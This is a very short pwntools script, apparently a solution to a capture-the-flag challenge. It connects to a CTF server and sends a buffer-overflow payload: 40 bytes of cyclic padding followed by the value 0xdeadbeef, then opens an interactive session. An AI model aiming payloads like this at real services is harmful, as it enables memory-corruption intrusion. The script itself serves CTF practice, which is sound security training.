#! /usr/bin/python3

from pwn import *

HOST = 'pwn.challs.ctf.shellmates.club'
PORT = '1402'

p = remote(HOST, PORT)

p.sendline(b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa\xef\xbe\xad\xde')

p.interactive()
